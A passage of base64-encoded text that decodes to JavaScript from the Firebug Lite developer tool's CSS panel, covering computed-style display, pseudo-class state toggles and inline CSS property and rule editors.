jdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIEVsZW1lbnQgPyAxIDogMDsNCiAgICB9LA0KDQogICAgdXBkYXRlVmlldzogZnVuY3Rpb24oZWxlbWVudCkNCiAgICB7DQogICAgICAgIHRoaXMudXBkYXRlQ2FzY2FkZVZpZXcoZWxlbWVudCk7DQogICAgICAgIGlmIChkb21VdGlscykNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5jb250ZW50U3RhdGUgPSBzYWZlR2V0Q29udGVudFN0YXRlKGVsZW1lbnQpOw0KICAgICAgICAgICAgdGhpcy5hZGRTdGF0ZUNoYW5nZUhhbmRsZXJzKGVsZW1lbnQpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIHVwZGF0ZVNlbGVjdGlvbjogZnVuY3Rpb24oZWxlbWVudCkNCiAgICB7DQogICAgICAgIGlmICggIWluc3RhbmNlT2YoZWxlbWVudCAsICJFbGVtZW50IikgKSAvLyBodG1sIHN1cHBvcnRzIFNvdXJjZUxpbmsNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAoc290aGlua0luc3RhbGxlZCkNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Z1JlcHMuV2FybmluZy50YWcucmVwbGFjZSh7b2JqZWN0OiAiU290aGlua1dhcm5pbmcifSwgdGhpcy5wYW5lbE5vZGUpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQoNCiAgICAgICAgLyoNCiAgICAgICAgaWYgKCFkb21VdGlscykNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Z1JlcHMuV2FybmluZy50YWcucmVwbGFjZSh7b2JqZWN0OiAiRE9NSW5zcGVjdG9yV2FybmluZyJ9LCB0aGlzLnBhbmVsTm9kZSk7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgLyoqLw0KDQogICAgICAgIGlmICghZWxlbWVudCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB0aGlzLnVwZGF0ZVZpZXcoZWxlbWVudCk7DQogICAgfSwNCg0KICAgIHVwZGF0ZU9wdGlvbjogZnVuY3Rpb24obmFtZSwgdmFsdWUpDQogICAgew0KICAgICAgICBpZiAobmFtZSA9PSAic2hvd1VzZXJBZ2VudENTUyIgfHwgbmFtZSA9PSAiZXhwYW5kU2hvcnRoYW5kUHJvcHMiKQ0KICAgICAgICAgICAgdGhpcy5yZWZyZXNoKCk7DQogICAgfSwNCg0KICAgIGdldE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciByZXQgPSBbDQogICAgICAgICAgICB7bGFiZWw6ICJTaG93IFVzZXIgQWdlbnQgQ1NTIiwgdHlwZTogImNoZWNrYm94IiwgY2hlY2tlZDogRmlyZWJ1Zy5zaG93VXNlckFnZW50Q1NTLA0KICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQoRmlyZWJ1Zy50b2dnbGVQcmVmLCBGaXJlYnVnLCAic2hvd1VzZXJBZ2VudENTUyIpIH0sDQogICAgICAgICAgICB7bGFiZWw6ICJFeHBhbmQgU2hvcnRoYW5kIFByb3BlcnRpZXMiLCB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBGaXJlYnVnLmV4cGFuZFNob3J0aGFuZFByb3BzLA0KICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiBiaW5kRml4ZWQoRmlyZWJ1Zy50b2dnbGVQcmVmLCBGaXJlYnVnLCAiZXhwYW5kU2hvcnRoYW5kUHJvcHMiKSB9DQogICAgICAgIF07DQogICAgICAgIGlmIChkb21VdGlscyAmJiB0aGlzLnNlbGVjdGlvbikNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHN0YXRlID0gc2FmZUdldENvbnRlbnRTdGF0ZSh0aGlzLnNlbGVjdGlvbik7DQoNCiAgICAgICAgICAgIHJldC5wdXNoKCItIik7DQogICAgICAgICAgICByZXQucHVzaCh7bGFiZWw6ICI6YWN0aXZlIiwgdHlwZTogImNoZWNrYm94IiwgY2hlY2tlZDogc3RhdGUgJiBTVEFURV9BQ1RJVkUsDQogICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLnVwZGF0ZUNvbnRlbnRTdGF0ZSwgdGhpcywgU1RBVEVfQUNUSVZFLCBzdGF0ZSAmIFNUQVRFX0FDVElWRSl9KTsNCiAgICAgICAgICAgIHJldC5wdXNoKHtsYWJlbDogIjpob3ZlciIsIHR5cGU6ICJjaGVja2JveCIsIGNoZWNrZWQ6IHN0YXRlICYgU1RBVEVfSE9WRVIsDQogICAgICAgICAgICAgIGNvbW1hbmQ6IGJpbmRGaXhlZCh0aGlzLnVwZGF0ZUNvbnRlbnRTdGF0ZSwgdGhpcywgU1RBVEVfSE9WRVIsIHN0YXRlICYgU1RBVEVfSE9WRVIpfSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHJldDsNCiAgICB9LA0KDQogICAgdXBkYXRlQ29udGVudFN0YXRlOiBmdW5jdGlvbihzdGF0ZSwgcmVtb3ZlKQ0KICAgIHsNCiAgICAgICAgZG9tVXRpbHMuc2V0Q29udGVudFN0YXRlKHJlbW92ZSA/IHRoaXMuc2VsZWN0aW9uLm93bmVyRG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50IDogdGhpcy5zZWxlY3Rpb24sIHN0YXRlKTsNCiAgICAgICAgdGhpcy5yZWZyZXNoKCk7DQogICAgfSwNCg0KICAgIGFkZFN0YXRlQ2hhbmdlSGFuZGxlcnM6IGZ1bmN0aW9uKGVsKQ0KICAgIHsNCiAgICAgIHRoaXMucmVtb3ZlU3RhdGVDaGFuZ2VIYW5kbGVycygpOw0KDQogICAgICAvKg0KICAgICAgYWRkRXZlbnQoZWwsICJmb2N1cyIsIHRoaXMub25TdGF0ZUNoYW5nZSk7DQogICAgICBhZGRFdmVudChlbCwgImJsdXIiLCB0aGlzLm9uU3RhdGVDaGFuZ2UpOw0KICAgICAgYWRkRXZlbnQoZWwsICJtb3VzZXVwIiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgIGFkZEV2ZW50KGVsLCAibW91c2Vkb3duIiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgIGFkZEV2ZW50KGVsLCAibW91c2VvdmVyIiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgIGFkZEV2ZW50KGVsLCAibW91c2VvdXQiLCB0aGlzLm9uU3RhdGVDaGFuZ2UpOw0KICAgICAgLyoqLw0KDQogICAgICB0aGlzLnN0YXRlQ2hhbmdlRWwgPSBlbDsNCiAgICB9LA0KDQogICAgcmVtb3ZlU3RhdGVDaGFuZ2VIYW5kbGVyczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHNlbCA9IHRoaXMuc3RhdGVDaGFuZ2VFbDsNCiAgICAgICAgaWYgKHNlbCkNCiAgICAgICAgew0KICAgICAgICAgICAgLyoNCiAgICAgICAgICAgIHJlbW92ZUV2ZW50KHNlbCwgImZvY3VzIiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgICAgICAgIHJlbW92ZUV2ZW50KHNlbCwgImJsdXIiLCB0aGlzLm9uU3RhdGVDaGFuZ2UpOw0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQoc2VsLCAibW91c2V1cCIsIHRoaXMub25TdGF0ZUNoYW5nZSk7DQogICAgICAgICAgICByZW1vdmVFdmVudChzZWwsICJtb3VzZWRvd24iLCB0aGlzLm9uU3RhdGVDaGFuZ2UpOw0KICAgICAgICAgICAgcmVtb3ZlRXZlbnQoc2VsLCAibW91c2VvdmVyIiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgICAgICAgIHJlbW92ZUV2ZW50KHNlbCwgIm1vdXNlb3V0IiwgdGhpcy5vblN0YXRlQ2hhbmdlKTsNCiAgICAgICAgICAgIC8qKi8NCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBjb250ZW50U3RhdGVDaGVjazogZnVuY3Rpb24oc3RhdGUpDQogICAgew0KICAgICAgICBpZiAoIXN0YXRlIHx8IHRoaXMuY29udGVudFN0YXRlICYgc3RhdGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB0aW1lb3V0UnVubmVyID0gYmluZEZpeGVkKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbmV3U3RhdGUgPSBzYWZlR2V0Q29udGVudFN0YXRlKHRoaXMuc2VsZWN0aW9uKTsNCiAgICAgICAgICAgICAgICBpZiAobmV3U3RhdGUgIT0gdGhpcy5jb250ZW50U3RhdGUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0aGlzLmNvbnRleHQuaW52YWxpZGF0ZVBhbmVscyh0aGlzLm5hbWUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sIHRoaXMpOw0KDQogICAgICAgICAgICAvLyBEZWxheSBleGVjIHVudGlsIGFmdGVyIHRoZSBldmVudCBoYXMgcHJvY2Vzc2VkIGFuZCB0aGUgc3RhdGUgaGFzIGJlZW4gdXBkYXRlZA0KICAgICAgICAgICAgc2V0VGltZW91dCh0aW1lb3V0UnVubmVyLCAwKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQpmdW5jdGlvbiBzYWZlR2V0Q29udGVudFN0YXRlKHNlbGVjdGlvbikNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIHJldHVybiBkb21VdGlscy5nZXRDb250ZW50U3RhdGUoc2VsZWN0aW9uKTsNCiAgICB9DQogICAgY2F0Y2ggKGUpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNzcy5zYWZlR2V0Q29udGVudFN0YXRlOyBFWENFUFRJT04iLCBlKTsNCiAgICB9DQp9DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpmdW5jdGlvbiBDU1NDb21wdXRlZEVsZW1lbnRQYW5lbCgpIHt9DQoNCkNTU0NvbXB1dGVkRWxlbWVudFBhbmVsLnByb3RvdHlwZSA9IGV4dGVuZChDU1NFbGVtZW50UGFuZWwucHJvdG90eXBlLA0Kew0KICAgIHRlbXBsYXRlOiBkb21wbGF0ZSgNCiAgICB7DQogICAgICAgIGNvbXB1dGVkVGFnOg0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAiYTExeUNTU1ZpZXciLCByb2xlIDogImxpc3QiLCAiYXJpYS1sYWJlbCIgOiAkU1RSKCdhcmlhLmxhYmVscy5jb21wdXRlZCBzdHlsZXMnKX0sDQogICAgICAgICAgICAgICAgRk9SKCJncm91cCIsICIkZ3JvdXBzIiwNCiAgICAgICAgICAgICAgICAgICAgSDEoeyJjbGFzcyI6ICJjc3NJbmhlcml0SGVhZGVyIGdyb3VwSGVhZGVyIGZvY3VzUm93Iiwgcm9sZSA6ICJsaXN0aXRlbSJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImNzc0luaGVyaXRMYWJlbCJ9LCAiJGdyb3VwLnRpdGxlIikNCiAgICAgICAgICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICAgICAgICAgVEFCTEUoe3dpZHRoOiAiMTAwJSIsIHJvbGUgOiAnZ3JvdXAnfSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFRCT0RZKHtyb2xlIDogJ3ByZXNlbnRhdGlvbid9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZPUigicHJvcCIsICIkZ3JvdXAucHJvcHMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUUih7ImNsYXNzIjogJ2ZvY3VzUm93IGNvbXB1dGVkU3R5bGVSb3cnLCByb2xlIDogJ2xpc3RpdGVtJ30sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBURCh7ImNsYXNzIjogInN0eWxlUHJvcE5hbWUiLCByb2xlIDogJ3ByZXNlbnRhdGlvbid9LCAiJHByb3AubmFtZSIpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVEQoeyJjbGFzcyI6ICJzdHlsZVByb3BWYWx1ZSIsIHJvbGUgOiAncHJlc2VudGF0aW9uJ30sICIkcHJvcC52YWx1ZSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApDQogICAgfSksDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICB1cGRhdGVDb21wdXRlZFZpZXc6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICB2YXIgd2luID0gaXNJRSA/DQogICAgICAgICAgICAgICAgZWxlbWVudC5vd25lckRvY3VtZW50LnBhcmVudFdpbmRvdyA6DQogICAgICAgICAgICAgICAgZWxlbWVudC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Ow0KICAgICAgICANCiAgICAgICAgdmFyIHN0eWxlID0gaXNJRSA/DQogICAgICAgICAgICAgICAgZWxlbWVudC5jdXJyZW50U3R5bGUgOg0KICAgICAgICAgICAgICAgIHdpbi5nZXRDb21wdXRlZFN0eWxlKGVsZW1lbnQsICIiKTsNCg0KICAgICAgICB2YXIgZ3JvdXBzID0gW107DQoNCiAgICAgICAgZm9yICh2YXIgZ3JvdXBOYW1lIGluIHN0eWxlR3JvdXBzKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBpMThuICRTVFINCiAgICAgICAgICAgIC8vdmFyIHRpdGxlID0gJFNUUigiU3R5bGVHcm91cC0iICsgZ3JvdXBOYW1lKTsNCiAgICAgICAgICAgIHZhciB0aXRsZSA9IHN0eWxlR3JvdXBUaXRsZXNbZ3JvdXBOYW1lXTsNCiAgICAgICAgICAgIHZhciBncm91cCA9IHt0aXRsZTogdGl0bGUsIHByb3BzOiBbXX07DQogICAgICAgICAgICBncm91cHMucHVzaChncm91cCk7DQoNCiAgICAgICAgICAgIHZhciBwcm9wcyA9IHN0eWxlR3JvdXBzW2dyb3VwTmFtZV07DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHByb3BzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBwcm9wTmFtZSA9IHByb3BzW2ldOw0KICAgICAgICAgICAgICAgIHZhciBwcm9wVmFsdWUgPSBzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlID8NCiAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlLmdldFByb3BlcnR5VmFsdWUocHJvcE5hbWUpIDoNCiAgICAgICAgICAgICAgICAgICAgICAgICIiK3N0eWxlW3RvQ2FtZWxDYXNlKHByb3BOYW1lKV07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHByb3BWYWx1ZSA9PT0gdW5kZWZpbmVkIHx8IHByb3BWYWx1ZSA9PT0gbnVsbCkgDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByb3BWYWx1ZSA9IHN0cmlwVW5pdHMocmdiVG9IZXgocHJvcFZhbHVlKSk7DQogICAgICAgICAgICAgICAgaWYgKHByb3BWYWx1ZSkNCiAgICAgICAgICAgICAgICAgICAgZ3JvdXAucHJvcHMucHVzaCh7bmFtZTogcHJvcE5hbWUsIHZhbHVlOiBwcm9wVmFsdWV9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHZhciByZXN1bHQgPSB0aGlzLnRlbXBsYXRlLmNvbXB1dGVkVGFnLnJlcGxhY2Uoe2dyb3VwczogZ3JvdXBzfSwgdGhpcy5wYW5lbE5vZGUpOw0KICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkNTU1J1bGVzQWRkZWQnLCBbdGhpcywgcmVzdWx0XSk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIFBhbmVsDQoNCiAgICBuYW1lOiAiY29tcHV0ZWQiLA0KICAgIHRpdGxlOiAiQ29tcHV0ZWQiLA0KICAgIHBhcmVudFBhbmVsOiAiSFRNTCIsDQogICAgb3JkZXI6IDEsDQoNCiAgICB1cGRhdGVWaWV3OiBmdW5jdGlvbihlbGVtZW50KQ0KICAgIHsNCiAgICAgICAgdGhpcy51cGRhdGVDb21wdXRlZFZpZXcoZWxlbWVudCk7DQogICAgfSwNCg0KICAgIGdldE9wdGlvbnNNZW51SXRlbXM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICB7bGFiZWw6ICJSZWZyZXNoIiwgY29tbWFuZDogYmluZCh0aGlzLnJlZnJlc2gsIHRoaXMpIH0NCiAgICAgICAgXTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDU1NFZGl0b3INCg0KZnVuY3Rpb24gQ1NTRWRpdG9yKGRvYykNCnsNCiAgICB0aGlzLmluaXRpYWxpemVJbmxpbmUoZG9jKTsNCn0NCg0KQ1NTRWRpdG9yLnByb3RvdHlwZSA9IGRvbXBsYXRlKEZpcmVidWcuSW5saW5lRWRpdG9yLnByb3RvdHlwZSwNCnsNCiAgICBpbnNlcnROZXdSb3c6IGZ1bmN0aW9uKHRhcmdldCwgaW5zZXJ0V2hlcmUpDQogICAgew0KICAgICAgICB2YXIgcnVsZSA9IEZpcmVidWcuZ2V0UmVwT2JqZWN0KHRhcmdldCk7DQogICAgICAgIHZhciBlbXB0eVByb3AgPSANCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gLSB1c2VzIGNoYXJDb2RlKDI1NSkgdG8gZm9yY2UgdGhlIGVsZW1lbnQgYmVpbmcgcmVuZGVyZWQsIA0KICAgICAgICAgICAgLy8gYWxsb3dpbmcgd2Via2l0IHRvIGdldCB0aGUgY29ycmVjdCBwb3NpdGlvbiBvZiB0aGUgcHJvcGVydHkgbmFtZSAic3BhbiIsDQogICAgICAgICAgICAvLyB3aGVuIGluc2VydGluZyBhIG5ldyBDU1MgcnVsZT8NCiAgICAgICAgICAgIG5hbWU6ICIiLA0KICAgICAgICAgICAgdmFsdWU6ICIiLA0KICAgICAgICAgICAgaW1wb3J0YW50OiAiIg0KICAgICAgICB9Ow0KDQogICAgICAgIGlmIChpbnNlcnRXaGVyZSA9PSAiYmVmb3JlIikNCiAgICAgICAgICAgIHJldHVybiBDU1NQcm9wVGFnLnRhZy5pbnNlcnRCZWZvcmUoe3Byb3A6IGVtcHR5UHJvcCwgcnVsZTogcnVsZX0sIHRhcmdldCk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiBDU1NQcm9wVGFnLnRhZy5pbnNlcnRBZnRlcih7cHJvcDogZW1wdHlQcm9wLCBydWxlOiBydWxlfSwgdGFyZ2V0KTsNCiAgICB9LA0KDQogICAgc2F2ZUVkaXQ6IGZ1bmN0aW9uKHRhcmdldCwgdmFsdWUsIHByZXZpb3VzVmFsdWUpDQogICAgew0KICAgICAgICAvLyBXZSBuZWVkIHRvIGNoZWNrIHRoZSB2YWx1ZSBmaXJzdCBpbiBvcmRlciB0byBhdm9pZCBhIHByb2JsZW0gaW4gSUU4IA0KICAgICAgICAvLyBTZWUgSXNzdWUgMzAzODogRW1wdHkgKG51bGwpIHN0eWxlcyB3aGVuIGFkZGluZyBDU1Mgc3R5bGVzIGluIEZpcmVidWcgTGl0ZSANCiAgICAgICAgaWYgKCF2YWx1ZSkgcmV0dXJuOw0KICAgICAgICANCiAgICAgICAgdGFyZ2V0LmlubmVySFRNTCA9IGVzY2FwZUZvckNzcyh2YWx1ZSk7DQoNCiAgICAgICAgdmFyIHJvdyA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJjc3NQcm9wIik7DQogICAgICAgIGlmIChoYXNDbGFzcyhyb3csICJkaXNhYmxlZFN0eWxlIikpDQogICAgICAgICAgICB0b2dnbGVDbGFzcyhyb3csICJkaXNhYmxlZFN0eWxlIik7DQoNCiAgICAgICAgdmFyIHJ1bGUgPSBGaXJlYnVnLmdldFJlcE9iamVjdCh0YXJnZXQpOw0KDQogICAgICAgIGlmIChoYXNDbGFzcyh0YXJnZXQsICJjc3NQcm9wTmFtZSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAodmFsdWUgJiYgcHJldmlvdXNWYWx1ZSAhPSB2YWx1ZSkgIC8vIG5hbWUgb2YgcHJvcGVydHkgaGFzIGNoYW5nZWQuDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHByb3BWYWx1ZSA9IGdldENoaWxkQnlDbGFzcyhyb3csICJjc3NQcm9wVmFsdWUiKVt0ZXh0Q29udGVudF07DQogICAgICAgICAgICAgICAgdmFyIHBhcnNlZFZhbHVlID0gcGFyc2VQcmlvcml0eShwcm9wVmFsdWUpOw0KDQogICAgICAgICAgICAgICAgaWYgKHByb3BWYWx1ZSAmJiBwcm9wVmFsdWUgIT0gInVuZGVmaW5lZCIpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NTUykNCiAgICAgICAgICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJDU1NFZGl0b3Iuc2F2ZUVkaXQgOiAiK3ByZXZpb3VzVmFsdWUrIi0+Iit2YWx1ZSsiID0gIitwcm9wVmFsdWUrIlxuIik7DQogICAgICAgICAgICAgICAgICAgIGlmIChwcmV2aW91c1ZhbHVlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRmlyZWJ1Zy5DU1NNb2R1bGUucmVtb3ZlUHJvcGVydHkocnVsZSwgcHJldmlvdXNWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgIEZpcmVidWcuQ1NTTW9kdWxlLnNldFByb3BlcnR5KHJ1bGUsIHZhbHVlLCBwYXJzZWRWYWx1ZS52YWx1ZSwgcGFyc2VkVmFsdWUucHJpb3JpdHkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKCF2YWx1ZSkgLy8gbmFtZSBvZiB0aGUgcHJvcGVydHkgaGFzIGJlZW4gZGVsZXRlZCwgc28gcmVtb3ZlIHRoZSBwcm9wZXJ0eS4NCiAgICAgICAgICAgICAgICBGaXJlYnVnLkNTU01vZHVsZS5yZW1vdmVQcm9wZXJ0eShydWxlLCBwcmV2aW91c1ZhbHVlKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiY3NzUHJvcFZhbHVlIikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwcm9wTmFtZSA9IGdldENoaWxkQnlDbGFzcyhyb3csICJjc3NQcm9wTmFtZSIpW3RleHRDb250ZW50XTsNCiAgICAgICAgICAgIHZhciBwcm9wVmFsdWUgPSBnZXRDaGlsZEJ5Q2xhc3Mocm93LCAiY3NzUHJvcFZhbHVlIilbdGV4dENvbnRlbnRdOw0KDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJDU1NFZGl0b3Iuc2F2ZUVkaXQgcHJvcE5hbWU9cHJvcFZhbHVlOiAiK3Byb3BOYW1lICsiID0gIitwcm9wVmFsdWUrIlxuIik7DQogICAgICAgICAgICAgICAvLyBGQlRyYWNlLnN5c291dCgiQ1NTRWRpdG9yLnNhdmVFZGl0IEJFRk9SRSBzdHlsZToiLHN0eWxlKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKHZhbHVlICYmIHZhbHVlICE9ICJudWxsIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgcGFyc2VkVmFsdWUgPSBwYXJzZVByaW9yaXR5KHZhbHVlKTsNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkNTU01vZHVsZS5zZXRQcm9wZXJ0eShydWxlLCBwcm9wTmFtZSwgcGFyc2VkVmFsdWUudmFsdWUsIHBhcnNlZFZhbHVlLnByaW9yaXR5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKHByZXZpb3VzVmFsdWUgJiYgcHJldmlvdXNWYWx1ZSAhPSAibnVsbCIpDQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5DU1NNb2R1bGUucmVtb3ZlUHJvcGVydHkocnVsZSwgcHJvcE5hbWUpOw0KICAgICAgICB9DQoNCiAgICAgICAgdGhpcy5wYW5lbC5tYXJrQ2hhbmdlKHRoaXMucGFuZWwubmFtZSA9PSAic3R5bGVzaGVldCIpOw0KICAgIH0sDQoNCiAgICBhZHZhbmNlVG9OZXh0OiBmdW5jdGlvbih0YXJnZXQsIGNoYXJDb2RlKQ0KICAgIHsNCiAgICAgICAgaWYgKGNoYXJDb2RlID09IDU4IC8qIjoiKi8gJiYgaGFzQ2xhc3ModGFyZ2V0LCAiY3NzUHJvcE5hbWUiKSkNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBnZXRBdXRvQ29tcGxldGVSYW5nZTogZnVuY3Rpb24odmFsdWUsIG9mZnNldCkNCiAgICB7DQogICAgICAgIGlmIChoYXNDbGFzcyh0aGlzLnRhcmdldCwgImNzc1Byb3BOYW1lIikpDQogICAgICAgICAgICByZXR1cm4ge3N0YXJ0OiAwLCBlbmQ6IHZhbHVlLmxlbmd0aC0xfTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmV0dXJuIHBhcnNlQ1NTVmFsdWUodmFsdWUsIG9mZnNldCk7DQogICAgfSwNCg0KICAgIGdldEF1dG9Db21wbGV0ZUxpc3Q6IGZ1bmN0aW9uKHByZUV4cHIsIGV4cHIsIHBvc3RFeHByKQ0KICAgIHsNCiAgICAgICAgaWYgKGhhc0NsYXNzKHRoaXMudGFyZ2V0LCAiY3NzUHJvcE5hbWUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIGdldENTU1Byb3BlcnR5TmFtZXMoKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciByb3cgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGhpcy50YXJnZXQsICJjc3NQcm9wIik7DQogICAgICAgICAgICB2YXIgcHJvcE5hbWUgPSBnZXRDaGlsZEJ5Q2xhc3Mocm93LCAiY3NzUHJvcE5hbWUiKVt0ZXh0Q29udGVudF07DQogICAgICAgICAgICByZXR1cm4gZ2V0Q1NTS2V5d29yZHNCeVByb3BlcnR5KHByb3BOYW1lKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQovLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy9DU1NSdWxlRWRpdG9yDQoNCmZ1bmN0aW9uIENTU1J1bGVFZGl0b3IoZG9jKQ0Kew0KICAgIHRoaXMuaW5pdGlhbGl6ZUlubGluZShkb2MpOw0KICAgIHRoaXMuY29tcGxldGVBc1lvdVR5cGUgPSBmYWxzZTsNCn0NCkNTU1J1bGVFZGl0b3IudW5pcXVpZmllciA9IDA7DQpDU1NSdWxlRWRpdG9yLnByb3RvdHlwZSA9IGRvbXBsYXRlKEZpcmVidWcuSW5saW5lRWRpdG9yLnByb3RvdHlwZSwNCnsNCiAgICBpbnNlcnROZXdSb3c6IGZ1bmN0aW9uKHRhcmdldCwgaW5zZXJ0V2hlcmUpDQogICAgew0KICAgICAgICAgdmFyIGVtcHR5UnVsZSA9IHsNCiAgICAgICAgICAgICAgICAgc2VsZWN0b3I6ICIiLA0KICAgICAgICAgICAgICAgICBpZDogIiIsDQogICAgICAgICAgICAgICAgIHByb3BzOiBbXSwNCiAgICAgICAgICAgICAgICAgaXNTZWxlY3RvckVkaXRhYmxlOiB0cnVlDQogICAgICAgICB9Ow0KDQogICAgICAgICBpZiAoaW5zZXJ0V2hlcmUgPT0gImJlZm9yZSIpD